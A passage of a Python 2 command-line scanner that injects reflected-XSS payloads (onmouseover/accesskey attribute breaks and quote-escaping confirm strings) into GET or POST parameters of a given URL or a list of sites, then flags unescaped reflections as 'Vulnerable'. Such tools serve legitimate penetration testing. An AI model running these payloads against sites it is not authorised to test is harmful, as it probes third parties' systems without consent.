			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_b = re.findall(z_search_b, html_content)
				z_control = re.findall('<html xmlns=', html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				payload_search_script_d = re.findall(z_search_script_d, html_content)
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c) + len(payload_search_script_d)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c) + len(payload_search_script_d)) == 0 and payload_search != [])):
					control = 1
				if (payload_search_b != [] or control == 1) and z_control == []:
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

			z_url = '%22%20accesskey%3D%22X%22%20onmouseover%3D%22confirm`XSS`%22'
			z_search = '" accesskey="X" onmouseover="confirm`XSS`"'
			z_search_b = '" Accesskey="X" Onmouseover="confirm`XSS`"'
			z_search_script = '"\\\\' + z_search + '",'
			z_search_script_a = '"\\\\' + z_search + '"}'
			z_search_script_b = '"\\\\' + z_search + '";'
			z_search_script_c = '\'' + z_search + '\''
			z_search_script_d = '>' + z_search + '<'
			z_payload = '" accesskey="X" onmouseover="confirm`XSS`"'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_b = re.findall(z_search_b, html_content)
				z_control = re.findall('<html xmlns=', html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				payload_search_script_b = re.findall(z_search_script_b, html_content)
				payload_search_script_c = re.findall(z_search_script_c, html_content)
				payload_search_script_d = re.findall(z_search_script_d, html_content)
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c) + len(payload_search_script_d)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a) + len(payload_search_script_b) + len(payload_search_script_c) + len(payload_search_script_d)) == 0 and payload_search != [])):
					control = 1
				if (payload_search_b != [] or control == 1) and z_control == []:
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

			z_url = '\\%22-confirm`XSS`//'
			z_search = '\\\\"-confirm`XSS`//'
			z_search_script = '\'' + z_search + '\''
			z_search_script_a = '>' + z_search + '<'
			z_payload = '\\"-confirm`XSS`//'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a)) == 0 and payload_search != [])):
					control = 1
				if control == 1:
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

			z_url = '\\%27-confirm`XSS`//'
			z_search = '\\\\\'-confirm`XSS`//'
			z_search_script = '"' + z_search + '"'
			z_search_script_a = '>' + z_search + '<'
			z_payload = '\\\'-confirm`XSS`//'
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
    				err = "Page not loaded."
			except socket.error as e:
    				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_script = re.findall(z_search_script, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				control = 0
				if ((len(payload_search_script) + len(payload_search_script_a)) < len(payload_search) or ((len(payload_search_script) + len(payload_search_script_a)) == 0 and payload_search != [])):
					control = 1
				if control == 1:
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1

			z_url = '%22-confirm`XSS`-%22%27-confirm`XSS`-%27'
			z_search = '"-confirm`XSS`-"'+'\'' + '-confirm`XSS`-\''
			z_search_script_a = '>' + z_search + '<'
			z_payload = '"-confirm`XSS`-"\'-confirm`XSS`-\''
			if post == '':
				url = url_return(site, list_parameters, i, z_url)
			else:
					payload = {post : z_payload}
					data_payload = urllib.urlencode(payload)
			err = ''
			try:
				if post == '':				
					request = urllib2.Request(url, headers = header)
				else:
					request = urllib2.Request(site, headers = header, data = data_payload)
				urllib2.urlopen(request, timeout = 3)
			except urllib2.URLError as e:
				err = "Page not loaded."
			except socket.timeout as e:
				err = "Page not loaded."
			except socket.error as e:
   				err = "Page not loaded."
			except urllib2.HTTPError as e:
    				err = "Page not loaded."
			except ssl.SSLError as e:
				err = "Page not loaded."
			except httplib.BadStatusLine as e:
				err = "Page not loaded."
			if err == '':
				html_content = urllib2.urlopen(request).read()
				payload_search = re.findall(z_search, html_content)
				payload_search_script_a = re.findall(z_search_script_a, html_content)
				control = 0
				if len(payload_search_script_a) < len(payload_search) or (len(payload_search_script_a) == 0 and payload_search != []):
					control = 1
				if control == 1:
					print '\x1b[1;39;49m' + 'Payload: ' + '\x1b[0m' + '\x1b[1;31;49m',z_payload,'\x1b[0m'
					print '\x1b[1;31;49m' + 'Vulnerable' + '\x1b[0m'
					j = 1
			else:
				e_count += 1


			if j == 0 and e_count < 4:
				print '\x1b[1;32;49m' + 'This parameter doesn\'t seem vulnerable.' + '\x1b[0m'
			if j == 0 and e_count > 3:
				print '\x1b[1;33;49m' + 'Page not loaded. Possible WAF or connection error.' + '\x1b[0m'
			print " "
			i += 1

# start text user interface
check = raw_input('\x1b[1;39;49m' + '\nType [S] if you want to check a single URL or [L] to check a list of sites: ' + '\x1b[0m')

while (check != 'L' and check != 'l' and check != 'S' and check != 's'):
	check = raw_input('\x1b[1;39;49m' + '\nChoose between the keys [S] or [L]:' + '\x1b[0m')

if (check == 'S' or check == 's'):

	while True:	
		post_check = raw_input('\x1b[1;39;49m' + '\nDo you want to check a POST parameter? [Y/N]: ' + '\x1b[0m')
		while (post_check != 'y' and post_check != 'Y' and post_check != 'n' and check != 'N'):
			post_check = raw_input('\x1b[1;39;49m' + '\nChoose between the keys [Y] or [N]:' + '\x1b[0m')
		if (post_check == 'N' or post_check == 'n'):
			site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
			while (len(site) < 8):
				site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
			http = site.split('//', 1)[:1]
			http = str(http[0])+'//'
			while (http != 'http://' and http != 'https://'):
				site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
				http = site.split('//', 1)[:1]
				http = str(http[0])+'//'
			now = int(time.time())
			post = ''
			url_xss_finder(site, post)
			end = int(time.time()) - now
			print('\x1b[1;39;49m' + '\nTime to check URL: ' + str(end) + ' seconds.' + '\x1b[0m')
		else:
			post = raw_input('\x1b[1;39;49m' + '\nType POST parameter: ' + '\x1b[0m')
			while (post == ''):
				post = raw_input('\x1b[1;39;49m' + '\nPlease insert POST parameter: ' + '\x1b[0m')
			site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
			while (len(site) < 8):
				site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
			http = site.split('//', 1)[:1]
			http = str(http[0])+'//'
			while (http != 'http://' and http != 'https://'):
				site = raw_input('\x1b[1;39;49m' + '\nInsert site (with http(s)): ' + '\x1b[0m')
				http = site.split('//', 1)[:1]
				http = str(http[0])+'//'
			now = int(time.time())
			url_xss_finder(site, post)
			end = int(time.time()) - now
			print('\x1b[1;39;49m' + '\nTime to check URL: ' + str(end) + ' seconds.' + '\x1b[0m')
		

if (check == 'L' or check == 'l'):
	
	listsite = raw_input('\x1b[1;39;49m' + '\nWrite path of list (*.txt): ' + '\x1b[0m')	
	ext = os.path.splitext(listsite)[-1].lower()
	real = os.path.exists(listsite)
	while real != True or ext != '.txt':
		listsite = raw_input('\x1b[1;39;49m' + '\nFormat or file path incorrect.\nWrite path of list (*.txt): ' + '\x1b[0m')
		ext = os.path.splitext(listsite)[-1].lower()
		real = os.path.exists(listsite)
	open_file = open(listsite)
	open_file = open_file.readlines()
	for lines in open_file[0:]:
		print '\x1b[1;39;49m' + '\nCheck URL: ' + lines + '\x1b[0m'
		if len(lines) < 8:
			print '\x1b[1;31;49m' + 'URL not valid.' + '\x1b[0m'
			continue
		http = lines.split('//', 1)[:1]
		http = str(http[0])+'//'
		if (http != 'http://' and http != 'https://'):
			print '\x1b[1;31;49m' + 'URL not valid.' + '\x1b[0m'
			continue
		now = int(time.time())
		url_xss_finder(lines)
		end = int(time.time()) - now
		print('\x1b[1;39;49m' + '\nTime to check URL: ' + str(end) + ' seconds.' + '\x1b[0m')
